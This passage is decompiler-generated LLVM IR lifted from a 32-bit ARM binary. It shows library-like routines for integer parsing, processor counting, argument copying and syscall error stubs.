bb54:                                             ; preds = %dec_label_pc_162c0
  %v3_162d8 = mul i32 %v1_162cc, 2
  store i32 %v3_162d8, i32* %r5.global-to-local, align 4
  %v2_162dc = add i32 %v0_162c0, 2
  store i32 %v2_162dc, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_162c0, %bb53, %bb54
  %v0_162e0 = phi i32 [ %v1_162b4, %bb53 ], [ %v3_162d8, %bb54 ], [ %v1_162cc, %dec_label_pc_162c0 ]
  %v5_162e4 = icmp slt i32 %v0_162e0, 16
  br i1 %v5_162e4, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_162fc = phi i32 [ %v0_16250, %bb52 ], [ %v0_162e0, %.thread8 ], [ 16, %bb55 ]
  %v1_162e8 = add i32 %v0_162fc, -2
  %tmp = icmp ugt i32 %v1_162e8, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_162f8

.thread:                                          ; preds = %bb56
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_163a4

dec_label_pc_162f8:                               ; preds = %bb56
  %v2_16300 = call i32 @function_12514(i32 -1, i32 %v0_162fc)
  store i32 -1, i32* @r0, align 4
  %v0_1630c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1630c, i32* @r1, align 4
  %v1_16310 = urem i32 %v0_162fc, 256
  store i32 %v1_16310, i32* %sl.global-to-local, align 4
  %v0_16314 = call i32 @function_12418()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_16314, i32* %r8.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  %v0_1632c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1632c

dec_label_pc_16328:                               ; preds = %bb63, %dec_label_pc_16388
  %v0_16328 = phi i32 [ %v1_1636836, %bb63 ], [ %v0_16328.pre, %dec_label_pc_16388 ]
  store i32 %v0_16328, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1632c

dec_label_pc_1632c:                               ; preds = %dec_label_pc_162f8, %dec_label_pc_16328
  %v0_16368 = phi i32 [ %v0_1632c.pre, %dec_label_pc_162f8 ], [ %v0_16328, %dec_label_pc_16328 ]
  %v1_1632c = inttoptr i32 %v0_16368 to i8*
  %v2_1632c = load i8, i8* %v1_1632c, align 1
  %v3_1632c = zext i8 %v2_1632c to i32
  %v1_16330 = add nsw i32 %v3_1632c, -48
  %v1_16334 = urem i32 %v1_16330, 256
  %v1_1633c = or i32 %v3_1632c, 32
  %tmp71 = icmp ult i32 %v1_16334, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_16344

dec_label_pc_16344:                               ; preds = %dec_label_pc_1632c
  %tmp72 = icmp ugt i32 %v1_1633c, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_16344
  %v1_16348 = add nsw i32 %v1_1633c, -87
  %v5_16350 = urem i32 %v1_16348, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_1632c, %dec_label_pc_16344, %bb57
  %v3_16380 = phi i32 [ %v1_16334, %dec_label_pc_1632c ], [ 40, %dec_label_pc_16344 ], [ %v5_16350, %bb57 ]
  %v1_16354 = load i32, i32* %r5.global-to-local, align 4
  %v6_16358 = icmp slt i32 %v3_16380, %v1_16354
  br i1 %v6_16358, label %dec_label_pc_1635c, label %dec_label_pc_163a4.loopexit

dec_label_pc_1635c:                               ; preds = %bb58
  %v0_1635c = load i32, i32* @ip, align 4
  %v1_1635c = load i32, i32* %r8.global-to-local, align 4
  %v9_1635c = icmp eq i32 %v0_1635c, %v1_1635c
  br i1 %v9_1635c, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_1635c
  %v1_1636832 = add i32 %v0_16368, 1
  store i32 %v1_1636832, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16370

bb59:                                             ; preds = %dec_label_pc_1635c
  %v3_1635c = icmp ult i32 %v0_1635c, %v1_1635c
  %v1_16368 = add i32 %v0_16368, 1
  store i32 %v1_16368, i32* %r4.global-to-local, align 4
  br i1 %v3_1635c, label %dec_label_pc_16370, label %dec_label_pc_16388

dec_label_pc_16370:                               ; preds = %bb59, %.thread31
  %v1_1636836 = phi i32 [ %v1_1636832, %.thread31 ], [ %v1_16368, %bb59 ]
  %v4_163782235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_16370 = load i32, i32* %sl.global-to-local, align 4
  %v3_16370 = icmp uge i32 %v3_16380, %v1_16370
  %v9_16370 = icmp eq i32 %v3_16380, %v1_16370
  %v2_16374 = xor i1 %v3_16370, true
  %v3_16374 = or i1 %v9_16370, %v2_16374
  br i1 %v3_16374, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_16370
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_16370, %bb60
  %v4_16378 = phi i32 [ %v4_163782235, %dec_label_pc_16370 ], [ 0, %bb60 ]
  %v2_16378 = xor i1 %v9_16370, true
  %v3_16378 = and i1 %v3_16370, %v2_16378
  br i1 %v3_16378, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_16378 = urem i32 %v4_16378, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_1637c = phi i32 [ %v5_16378, %bb62 ], [ %v4_16378, %bb61 ]
  %v2_1637c = icmp eq i32 %v0_1637c, 0
  br i1 %v2_1637c, label %bb63, label %dec_label_pc_16388

bb63:                                             ; preds = %thread-pre-split
  %v4_16380 = mul i32 %v0_1635c, %v1_16354
  %v5_16380 = add i32 %v4_16380, %v3_16380
  store i32 %v5_16380, i32* @ip, align 4
  br label %dec_label_pc_16328

dec_label_pc_16388:                               ; preds = %bb59, %thread-pre-split
  %v0_16388 = call i32 @function_12b24()
  %v0_16390 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_16390, i32* @ip, align 4
  %v0_16394 = load i32, i32* @r7, align 4
  %v2_16394 = and i32 %v0_16394, %v0_16258
  store i32 %v2_16394, i32* @r7, align 4
  %v2_1639c = inttoptr i32 %v0_16388 to i32*
  store i32 34, i32* %v2_1639c, align 4
  %v0_16328.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16328

dec_label_pc_163a4.loopexit:                      ; preds = %bb58
  %v0_163a4.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_163a4

dec_label_pc_163a4:                               ; preds = %.thread, %dec_label_pc_163a4.loopexit
  %v2_163a8 = phi i32 [ %v0_163a4.pre, %dec_label_pc_163a4.loopexit ], [ %v0_1624c, %.thread ]
  %v2_163a4 = icmp eq i32 %v2_163a8, 0
  br i1 %v2_163a4, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_163a4
  %v1_163a8 = load i32, i32* %r6.global-to-local, align 4
  %v3_163a8 = inttoptr i32 %v2_163a8 to i32*
  store i32 %v1_163a8, i32* %v3_163a8, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_163a4, %bb64
  %v0_163b0 = load i32, i32* @r7, align 4
  %v2_163b0 = icmp eq i32 %v0_163b0, 0
  %. = select i1 %v2_163b0, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_163bc = icmp eq i32 %v0_16258, 0
  %v0_163e0.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_163bc, label %dec_label_pc_163d8, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_163e0.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_163c8, label %dec_label_pc_163d8

dec_label_pc_163c8:                               ; preds = %bb68
  %v0_163c8 = call i32 @function_12b24()
  %v2_163d0 = inttoptr i32 %v0_163c8 to i32*
  store i32 34, i32* %v2_163d0, align 4
  %v0_163d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_163d4, i32* @ip, align 4
  %v0_163d8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_163d8

dec_label_pc_163d8:                               ; preds = %bb68, %bb65, %dec_label_pc_163c8
  %v0_163e0.pre = phi i32 [ %v0_163e0.pre.pre, %bb68 ], [ %v0_163d4, %dec_label_pc_163c8 ], [ %v0_163e0.pre.pre, %bb65 ]
  %v0_163d8 = phi i32 [ %v0_163b0, %bb68 ], [ %v0_163d8.pre, %dec_label_pc_163c8 ], [ %v0_163b0, %bb65 ]
  %v2_163d8 = icmp eq i32 %v0_163d8, 0
  br i1 %v2_163d8, label %dec_label_pc_163d8._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_163d8
  %v2_163dc = sub i32 0, %v0_163e0.pre
  store i32 %v2_163dc, i32* @ip, align 4
  br label %dec_label_pc_163d8._crit_edge

dec_label_pc_163d8._crit_edge:                    ; preds = %dec_label_pc_163d8, %bb69
  %v0_163e0 = phi i32 [ %v2_163dc, %bb69 ], [ %v0_163e0.pre, %dec_label_pc_163d8 ]
  store i32 %v3_16238, i32* @r4, align 4
  store i32 %v12_16238, i32* @r7, align 4
  ret i32 %v0_163e0

; uselistorder directives
  uselistorder i32 %v0_163e0.pre, { 1, 0 }
  uselistorder i32 %v0_163e0.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_16378, { 1, 0 }
  uselistorder i1 %v3_16370, { 1, 0 }
  uselistorder i32 %v1_16370, { 1, 0 }
  uselistorder i32 %v1_1633c, { 1, 0 }
  uselistorder i32 %v1_16334, { 1, 0 }
  uselistorder i32 %v0_16368, { 1, 0, 2 }
  uselistorder i32 %v0_16328, { 1, 0 }
  uselistorder i32 %v3_162d8, { 1, 0 }
  uselistorder i32 %v1_162cc, { 1, 0, 2 }
  uselistorder i32 %v0_1629c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16258, { 1, 0 }
  uselistorder i32 %v0_16250, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_163d8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_163d8, { 2, 0, 1 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_163a4, { 1, 0 }
  uselistorder label %dec_label_pc_16388, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1632c, { 1, 0 }
  uselistorder label %dec_label_pc_16328, { 1, 0 }
  uselistorder label %bb56, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_162a0, { 1, 0 }
  uselistorder label %dec_label_pc_1629c, { 1, 0 }
  uselistorder label %dec_label_pc_16264, { 1, 0 }
}

define i32 @function_163f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_163f8:
  %stack_var_-16 = alloca i32, align 4
  store i32 180260, i32* @r5, align 4
  %v4_16404 = load i32, i32* inttoptr (i32 180356 to i32*), align 4
  store i32 %v4_16404, i32* @r4, align 4
  %v2_1640c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_16424 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_16424)
  %v0_16438 = load i32, i32* @r5, align 4
  %v2_16438 = add i32 %v0_16438, 16
  %v3_16438 = inttoptr i32 %v2_16438 to i32*
  %v4_16438 = load i32, i32* %v3_16438, align 4
  call void @__pseudo_branch(i32 %v4_16438)
  %v4_16448 = load i32, i32* @global_var_32aa8.858, align 4
  %v2_1644c = icmp eq i32 %v4_16448, 0
  br i1 %v2_1644c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_163f8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_163f8, %bb
  %v2_16458 = xor i1 %v2_1644c, true
  call void @__pseudo_cond_branch(i1 %v2_16458, i32 %v4_16448)
  store i32 %v2_1640c, i32* @r0, align 4
  %v0_16468 = load i32, i32* @r5, align 4
  %v2_16468 = add i32 %v0_16468, 24
  %v3_16468 = inttoptr i32 %v2_16468 to i32*
  %v4_16468 = load i32, i32* %v3_16468, align 4
  call void @__pseudo_branch(i32 %v4_16468)
  %v0_16474 = call i32 @function_16d70()
  %v0_1647c = load i32, i32* @r5, align 4
  %v9_1647c = icmp eq i32 %v0_1647c, 103264
  br i1 %v9_1647c, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_16484 = xor i1 %v9_1647c, true
  call void @__pseudo_cond_branch(i1 %v2_16484, i32 ptrtoint (i32* @global_var_12cc4.861 to i32))
  %v0_16488 = load i32, i32* @r6, align 4
  %v1_1648c = call i32 @function_12a34(i32 %v0_16488)
  %v0_16490 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16490, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_16490 = load i32, i32* @r1, align 4
  %v8_16490 = shl i32 %v4_16468, %v4_16468
  %v9_16490 = and i32 %v1_16490, %v8_16490
  store i32 %v9_16490, i32* @r5, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_164a8 = phi i32 [ %v1_1648c, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_164a8

; uselistorder directives
  uselistorder i1 %v9_1647c, { 1, 0 }
  uselistorder i32 %v4_16468, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_164b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_164b0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_164b0 = load i32, i32* @r4, align 4
  %v6_164b0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_164b4 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_164b4, label %dec_label_pc_16548, label %dec_label_pc_164c4

dec_label_pc_164c4:                               ; preds = %dec_label_pc_164b0
  %v2_164d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_164e8 = call i32 @function_17364(i32 17, i32 0, i32 %v2_164d4)
  %v3_164ec = load i32, i32* %stack_var_-44, align 4
  %v7_164f0 = icmp eq i32 %v3_164ec, 1
  br i1 %v7_164f0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_164c4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_164c4, %bb
  call void @__pseudo_cond_branch(i1 %v7_164f0, i32 ptrtoint (i32* @global_var_12a60.863 to i32))
  %v2_16504 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1650c = call i32 @function_175d8(i32 %v2_16504, i32 %v2_16504)
  %v2_16510 = icmp eq i32 %v2_1650c, 0
  br i1 %v2_16510, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_16524 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_16524, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_16534 = load i32, i32* %stack_var_-24, align 4
  %v1_16538 = and i32 %v3_16534, 65536
  %v2_16538 = icmp eq i32 %v1_16538, 0
  br i1 %v2_16538, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_16538, i32 ptrtoint (i32* @global_var_12a60.863 to i32))
  %v0_16548.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_164b0, %.thread6
  %v0_16548 = phi i32 [ %v0_16548.pre, %.thread6 ], [ 0, %dec_label_pc_164b0 ]
  store i32 %v3_164b0, i32* @r4, align 4
  store i32 %v6_164b0, i32* @lr, align 4
  ret i32 %v0_16548

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_17364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16548, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1655c() local_unnamed_addr {
dec_label_pc_1655c:
  %stack_var_-36 = alloca i32, align 4
  store i32 180260, i32* @r4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_238e4.867 to i32), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v2_1657c = call i32 @function_17db0(i32 ptrtoint ([11 x i8]* @global_var_238e4.867 to i32))
  store i32 %v2_1657c, i32* @r6, align 4
  %v2_16580 = icmp eq i32 %v2_1657c, 0
  br i1 %v2_16580, label %dec_label_pc_16600, label %dec_label_pc_16588

dec_label_pc_16588:                               ; preds = %dec_label_pc_1655c
  store i32 1524, i32* @sl, align 4
  store i32 ptrtoint (i32* @global_var_238f0.870 to i32), i32* @r8, align 4
  %v2_16594 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16594, i32* @r7, align 4
  br label %bb18

dec_label_pc_1659c:                               ; preds = %bb18
  %v3_1659c = load i32, i32* %stack_var_-36, align 4
  %v1_165a0 = inttoptr i32 %v3_1659c to i32*
  %v2_165a0 = load i32, i32* %v1_165a0, align 4
  %v1_165a4 = inttoptr i32 %v2_165a0 to i8*
  %v2_165a4 = load i8, i8* %v1_165a4, align 1
  %v7_165a8 = icmp eq i8 %v2_165a4, 99
  br i1 %v7_165a8, label %dec_label_pc_165b0, label %.backedge3

dec_label_pc_165b0:                               ; preds = %dec_label_pc_1659c
  %v1_165b0 = add i32 %v2_165a0, 1
  %v2_165b0 = inttoptr i32 %v1_165b0 to i8*
  %v3_165b0 = load i8, i8* %v2_165b0, align 1
  %v7_165b4 = icmp eq i8 %v3_165b0, 112
  br i1 %v7_165b4, label %dec_label_pc_165bc, label %.backedge3

dec_label_pc_165bc:                               ; preds = %dec_label_pc_165b0
  %v1_165bc = add i32 %v2_165a0, 2
  %v2_165bc = inttoptr i32 %v1_165bc to i8*
  %v3_165bc = load i8, i8* %v2_165bc, align 1
  %v7_165c0 = icmp eq i8 %v3_165bc, 117
  br i1 %v7_165c0, label %dec_label_pc_165c8, label %.backedge3

dec_label_pc_165c8:                               ; preds = %dec_label_pc_165bc
  %v1_165c8 = add i32 %v2_165a0, 3
  %v2_165c8 = inttoptr i32 %v1_165c8 to i8*
  %v3_165c8 = load i8, i8* %v2_165c8, align 1
  %v4_165c8 = zext i8 %v3_165c8 to i32
  %v0_165cc = load i32, i32* @r4, align 4
  %v1_165cc = load i32, i32* @sl, align 4
  %v2_165cc = add i32 %v1_165cc, %v0_165cc
  %v3_165cc = inttoptr i32 %v2_165cc to i32*
  %v4_165cc = load i32, i32* %v3_165cc, align 4
  %v2_165d0 = mul nuw nsw i32 %v4_165c8, 2
  %v2_165d4 = add i32 %v4_165cc, %v2_165d0
  %v3_165d4 = inttoptr i32 %v2_165d4 to i16*
  %v4_165d4 = load i16, i16* %v3_165d4, align 2
  %v1_165d8 = and i16 %v4_165d4, 8
  %v2_165d8 = icmp eq i16 %v1_165d8, 0
  br i1 %v2_165d8, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_165c8
  %v1_165dc = load i32, i32* @r5, align 4
  %v2_165dc = add i32 %v1_165dc, 1
  store i32 %v2_165dc, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_165c8, %dec_label_pc_1659c, %dec_label_pc_165b0, %dec_label_pc_165bc
  %v0_165e0.pre = load i32, i32* @r6, align 4
  %v0_165ec.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_16588
  %v0_165ec = phi i32 [ %v0_165ec.pre, %.backedge3 ], [ ptrtoint (i32* @global_var_238f0.870 to i32), %dec_label_pc_16588 ]
  %v0_165e0 = phi i32 [ %v0_165e0.pre, %.backedge3 ], [ %v2_1657c, %dec_label_pc_16588 ]
  %v4_165f0 = inttoptr i32 %v0_165e0 to i32*
  %v5_165f0 = call i32 @function_17a54(i32* %v4_165f0, i32 %v2_16594, i32 258, i32 %v0_165ec)
  %v2_165f4 = icmp eq i32 %v5_165f0, 0
  br i1 %v2_165f4, label %dec_label_pc_16664, label %dec_label_pc_1659c

dec_label_pc_16600:                               ; preds = %dec_label_pc_1655c
  store i32 ptrtoint ([14 x i8]* @global_var_238f4.873 to i32), i32* @r0, align 4
  %v2_16608 = call i32 @function_17db0(i32 ptrtoint ([14 x i8]* @global_var_238f4.873 to i32))
  store i32 %v2_16608, i32* @r6, align 4
  %v2_1660c = icmp eq i32 %v2_16608, 0
  br i1 %v2_1660c, label %bb19, label %dec_label_pc_16618

bb19:                                             ; preds = %dec_label_pc_16600
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16664

dec_label_pc_16618:                               ; preds = %dec_label_pc_16600
  store i32 ptrtoint ([10 x i8]* @global_var_23904.875 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_23928.877 to i32), i32* @r7, align 4
  %v2_16628 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16628, i32* @r4, align 4
  br label %bb21

dec_label_pc_16630:                               ; preds = %bb21
  %v0_1665c = load i32, i32* @r8, align 4
  %v1_1665c = inttoptr i32 %v0_1665c to i8*
  %v3_16630 = load i32, i32* %stack_var_-36, align 4
  %v1_16634 = inttoptr i32 %v3_16630 to i32*
  %v2_16634 = load i32, i32* %v1_16634, align 4
  store i32 %v2_16634, i32* @r1, align 4
  %v4_16638 = call i32 @function_13fe0(i8* %v1_1665c, i32 %v2_16634)
  %v2_1663c = icmp eq i32 %v4_16638, 0
  br i1 %v2_1663c, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_16630
  %v1_16640 = load i32, i32* @r5, align 4
  %v2_16640 = add i32 %v1_16640, 1
  store i32 %v2_16640, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_16630
  %v0_1664c.pre = load i32, i32* @r7, align 4
  %v0_16650.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_16618
  %v0_16650 = phi i32 [ %v0_16650.pre, %.backedge ], [ %v2_16608, %dec_label_pc_16618 ]
  %v0_1664c = phi i32 [ %v0_1664c.pre, %.backedge ], [ ptrtoint (i32* @global_var_23928.877 to i32), %dec_label_pc_16618 ]
  %v4_16654 = inttoptr i32 %v0_16650 to i32*
  %v5_16654 = call i32 @function_17a54(i32* %v4_16654, i32 %v2_16628, i32 459266, i32 %v0_1664c)
  %v2_16658 = icmp eq i32 %v5_16654, 0
  br i1 %v2_16658, label %dec_label_pc_16664, label %dec_label_pc_16630

dec_label_pc_16664:                               ; preds = %bb18, %bb21, %bb19
  %v0_16664 = load i32, i32* @r6, align 4
  %v1_16668 = inttoptr i32 %v0_16664 to i32*
  %v2_16668 = call i32 @function_17d7c(i32* %v1_16668)
  %v0_1666c = load i32, i32* @r5, align 4
  %v2_1666c = icmp eq i32 %v0_1666c, 0
  %.v0_1666c = select i1 %v2_1666c, i32 1, i32 %v0_1666c
  ret i32 %.v0_1666c

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_16664, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @function_166a8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_166a8:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_16a90

bb:                                               ; preds = %dec_label_pc_166a8
  %v7_166bc = mul i32 %arg1, 4
  %v8_166bc = add i32 %v7_166bc, ptrtoint (i32* @global_var_166c4.881 to i32)
  call void @__pseudo_branch(i32 %v8_166bc)
  br label %dec_label_pc_16a90

dec_label_pc_16a90:                               ; preds = %bb, %dec_label_pc_166a8
  %v0_16a90 = call i32 @function_12b24()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16a9c = inttoptr i32 %v0_16a90 to i32*
  store i32 22, i32* %v2_16a9c, align 4
  %v0_16c4c = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_16c4c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_16c80(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_16c80:
  %ip.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_16c80 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_16c80, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_16c94 = ptrtoint i32* %stack_var_-40 to i32
  %v2_16c98 = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_16ca8

dec_label_pc_16ca8:                               ; preds = %dec_label_pc_16ca8, %dec_label_pc_16c80
  %v0_16cbc = phi i32 [ 0, %dec_label_pc_16c80 ], [ %v1_16cbc, %dec_label_pc_16ca8 ]
  %stack_var_-36.0 = phi i32 [ %v2_16c98, %dec_label_pc_16c80 ], [ %v1_16cb0, %dec_label_pc_16ca8 ]
  %v1_16cac = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_16cac = load i32, i32* %v1_16cac, align 4
  %v1_16cb0 = add i32 %stack_var_-36.0, 4
  %v2_16cb4 = icmp eq i32 %v2_16cac, 0
  %v1_16cbc = add i32 %v0_16cbc, 1
  store i32 %v1_16cbc, i32* @lr, align 4
  br i1 %v2_16cb4, label %dec_label_pc_16cc4, label %dec_label_pc_16ca8

dec_label_pc_16cc4:                               ; preds = %dec_label_pc_16ca8
  %v3_16cc4 = mul i32 %v1_16cbc, 4
  %v1_16cc8 = add i32 %v3_16cc4, 18
  %v1_16ccc = and i32 %v1_16cc8, -8
  %v2_16cd0 = sub i32 %v2_16c94, %v1_16ccc
  %v2_16cd8 = inttoptr i32 %v2_16cd0 to i32*
  store i32 %arg1, i32* %v2_16cd8, align 4
  %v0_16ce4 = load i32, i32* @sp, align 4
  store i32 %v0_16ce4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16cec

dec_label_pc_16cec:                               ; preds = %dec_label_pc_16cec, %dec_label_pc_16cc4
  %v1_16d00 = phi i32 [ %v0_16ce4, %dec_label_pc_16cc4 ], [ %v5_16d00, %dec_label_pc_16cec ]
  %stack_var_-36.1 = phi i32 [ %v2_16c98, %dec_label_pc_16cc4 ], [ %v1_16cf8, %dec_label_pc_16cec ]
  %v1_16cf0 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_16cf0 = load i32, i32* %v1_16cf0, align 4
  %v0_16cf4 = load i32, i32* @lr, align 4
  %v1_16cf4 = add i32 %v0_16cf4, -1
  store i32 %v1_16cf4, i32* @lr, align 4
  %v7_16cf4 = icmp eq i32 %v0_16cf4, 1
  %v1_16cf8 = add i32 %stack_var_-36.1, 4
  %v2_16d00 = add i32 %v1_16d00, 4
  %v3_16d00 = inttoptr i32 %v2_16d00 to i32*
  store i32 %v2_16cf0, i32* %v3_16d00, align 4
  %v4_16d00 = load i32, i32* %ip.global-to-local, align 4
  %v5_16d00 = add i32 %v4_16d00, 4
  store i32 %v5_16d00, i32* %ip.global-to-local, align 4
  br i1 %v7_16cf4, label %dec_label_pc_16d08, label %dec_label_pc_16cec

dec_label_pc_16d08:                               ; preds = %dec_label_pc_16cec
  %v0_16d14 = call i32 @function_17438()
  ret i32 %v0_16d14

; uselistorder directives
  uselistorder i32 %v5_16d00, { 1, 0 }
  uselistorder i32 %v0_16cf4, { 1, 0 }
  uselistorder i32 %v1_16cbc, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_16d28(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d28:
  %v0_16d28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16d28, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_16d28
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_16d28, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_16d34() local_unnamed_addr {
dec_label_pc_16d34:
  ret i32 0
}

define i32 @function_16d3c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16d3c:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_16d3c = add i32 %tmp, 4
  %v4_16d3c = inttoptr i32 %v3_16d3c to i32*
  store i32 %arg3, i32* %v4_16d3c, align 4
  ret i32 %tmp
}

define i32 @function_16d44(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16d44:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
